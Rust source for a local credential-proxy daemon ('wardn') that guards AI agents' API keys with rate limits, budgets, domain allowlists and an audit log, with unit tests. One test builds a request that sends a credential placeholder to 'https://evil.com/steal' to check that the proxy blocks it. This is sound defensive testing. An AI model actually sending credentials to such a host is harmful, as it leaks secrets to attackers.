use std::sync::Arc;
use std::time::Instant;

use axum::Router;
use tokio::sync::{Mutex, RwLock};

use crate::config::WardenConfig;
use crate::mcp::WardenMcpServer;
use crate::proxy::audit::AuditLog;
use crate::proxy::budget::BudgetTracker;
use crate::proxy::loop_guard::LoopGuard;
use crate::proxy::rate_limit::RateLimiter;
use crate::proxy::{self, ProxyState};
use crate::vault::Vault;

/// Daemon configuration.
pub struct DaemonConfig {
    pub host: String,
    pub port: u16,
    pub warden_config: WardenConfig,
}

impl Default for DaemonConfig {
    fn default() -> Self {
        Self {
            host: "127.0.0.1".to_string(),
            port: 7777,
            warden_config: WardenConfig::default(),
        }
    }
}

/// The wardn daemon — runs proxy + MCP server in a single process.
pub struct Daemon {
    vault: Arc<RwLock<Vault>>,
    rate_limiter: Arc<Mutex<RateLimiter>>,
    budget_tracker: Arc<Mutex<BudgetTracker>>,
    loop_guard: Arc<Mutex<LoopGuard>>,
    audit: Arc<std::sync::Mutex<AuditLog>>,
    config: DaemonConfig,
    started_at: Instant,
}

impl Daemon {
    /// Create a new daemon from a vault and config.
    pub fn new(vault: Vault, config: DaemonConfig) -> Self {
        let mut rate_limiter = RateLimiter::new();

        // Configure rate limits from config
        for (cred_name, cred_config) in &config.warden_config.credentials {
            if let Some(rl_config) = &cred_config.rate_limit {
                for agent in &cred_config.allowed_agents {
                    rate_limiter.configure(cred_name, agent, rl_config);
                }
            }
        }

        // Budgets are NOT seeded from config here — unlike rate limits,
        // they're read live from the vault on every proxy request (see
        // proxy::mod's budget check), so `wardn budget set` takes effect
        // immediately without a daemon restart.
        Self {
            vault: Arc::new(RwLock::new(vault)),
            rate_limiter: Arc::new(Mutex::new(rate_limiter)),
            budget_tracker: Arc::new(Mutex::new(BudgetTracker::new())),
            loop_guard: Arc::new(Mutex::new(LoopGuard::default())),
            audit: Arc::new(std::sync::Mutex::new(AuditLog::new())),
            config,
            started_at: Instant::now(),
        }
    }

    /// Build the HTTP proxy router.
    pub fn router(&self) -> Router {
        let state = Arc::new(ProxyState {
            vault: self.vault.clone(),
            rate_limiter: self.rate_limiter.clone(),
            budget_tracker: self.budget_tracker.clone(),
            loop_guard: self.loop_guard.clone(),
            audit: self.audit.clone(),
            config: self.config.warden_config.clone(),
            host: self.config.host.clone(),
            port: self.config.port,
            started_at: self.started_at,
            http_client: reqwest::Client::new(),
        });
        proxy::build_router(state)
    }

    /// Start the proxy server (blocking).
    pub async fn serve_proxy(&self) -> crate::Result<()> {
        let addr = format!("{}:{}", self.config.host, self.config.port);
        let listener = tokio::net::TcpListener::bind(&addr)
            .await
            .map_err(crate::WardenError::Io)?;

        tracing::info!("wardn proxy listening on {addr}");

        let router = self.router();
        axum::serve(listener, router)
            .await
            .map_err(|e| crate::WardenError::Io(std::io::Error::other(e)))?;

        Ok(())
    }

    /// Start the MCP server over stdio (blocking).
    pub async fn serve_mcp(&self, agent_id: String) -> Result<(), Box<dyn std::error::Error>> {
        tracing::info!("wardn MCP server starting for agent: {agent_id}");
        WardenMcpServer::serve_stdio(self.vault.clone(), self.rate_limiter.clone(), agent_id).await
    }

    /// Start both proxy and MCP concurrently.
    pub async fn serve_all(&self, mcp_agent_id: String) -> crate::Result<()> {
        let addr = format!("{}:{}", self.config.host, self.config.port);
        let listener = tokio::net::TcpListener::bind(&addr)
            .await
            .map_err(crate::WardenError::Io)?;

        tracing::info!("wardn daemon listening on {addr}");

        let router = self.router();
        let vault = self.vault.clone();
        let rl = self.rate_limiter.clone();

        tokio::select! {
            result = axum::serve(listener, router) => {
                result.map_err(|e| crate::WardenError::Io(std::io::Error::other(e.to_string())))?;
            }
            result = WardenMcpServer::serve_stdio(vault, rl, mcp_agent_id) => {
                result.map_err(|e| crate::WardenError::Io(std::io::Error::other(e.to_string())))?;
            }
        }

        Ok(())
    }

    /// Get a reference to the vault.
    pub fn vault(&self) -> &Arc<RwLock<Vault>> {
        &self.vault
    }

    /// Get a reference to the rate limiter.
    pub fn rate_limiter(&self) -> &Arc<Mutex<RateLimiter>> {
        &self.rate_limiter
    }

    /// Get a reference to the budget tracker.
    pub fn budget_tracker(&self) -> &Arc<Mutex<BudgetTracker>> {
        &self.budget_tracker
    }

    /// Get a reference to the loop guard.
    pub fn loop_guard(&self) -> &Arc<Mutex<LoopGuard>> {
        &self.loop_guard
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::{CredentialConfig, RateLimitConfig, TimePeriod};

    #[test]
    fn test_daemon_default_config() {
        let config = DaemonConfig::default();
        assert_eq!(config.host, "127.0.0.1");
        assert_eq!(config.port, 7777);
    }

    #[test]
    fn test_daemon_new_configures_rate_limits() {
        let mut warden_config = WardenConfig::default();
        warden_config.credentials.insert(
            "KEY".to_string(),
            CredentialConfig {
                scrub_patterns: Vec::new(),
                oauth: None,
                budget: None,
                allowed_agents: vec!["bot".to_string()],
                allowed_domains: vec![],
                rate_limit: Some(RateLimitConfig {
                    max_calls: 100,
                    per: TimePeriod::Hour,
                }),
            },
        );

        let vault = Vault::ephemeral();
        let daemon = Daemon::new(
            vault,
            DaemonConfig {
                warden_config,
                ..Default::default()
            },
        );

        // Rate limiter should be configured
        let rt = tokio::runtime::Runtime::new().unwrap();
        rt.block_on(async {
            let mut rl = daemon.rate_limiter.lock().await;
            let status = rl.status("KEY", "bot");
            assert!(status.is_some());
            assert_eq!(status.unwrap().limit, 100);
        });
    }

    #[tokio::test]
    async fn test_daemon_router_health() {
        let vault = Vault::ephemeral();
        let daemon = Daemon::new(vault, DaemonConfig::default());
        let app = daemon.router();

        let req = axum::http::Request::builder()
            .uri("/health")
            .body(axum::body::Body::empty())
            .unwrap();

        use tower::ServiceExt;
        let resp = app.oneshot(req).await.unwrap();
        assert_eq!(resp.status(), axum::http::StatusCode::OK);
    }

    #[tokio::test]
    async fn test_daemon_proxy_blocks_bad_domain() {
        let mut vault = Vault::ephemeral();
        vault
            .set_with_config(
                "KEY",
                "secret-long-value",
                &CredentialConfig {
                    scrub_patterns: Vec::new(),
                    oauth: None,
                    budget: None,
                    allowed_agents: vec![],
                    allowed_domains: vec!["api.good.com".to_string()],
                    rate_limit: None,
                },
            )
            .unwrap();
        let placeholder = vault.get_placeholder("KEY", "agent").unwrap().to_string();

        let daemon = Daemon::new(vault, DaemonConfig::default());
        let app = daemon.router();

        let req = axum::http::Request::builder()
            .method("POST")
            .uri("https://evil.com/steal")
            .header("host", "evil.com")
            .header("x-warden-agent", "agent")
            .header("authorization", format!("Bearer {placeholder}"))
            .body(axum::body::Body::empty())
            .unwrap();

        use tower::ServiceExt;
        let resp = app.oneshot(req).await.unwrap();
        assert_eq!(resp.status(), axum::http::StatusCode::FORBIDDEN);
    }
}
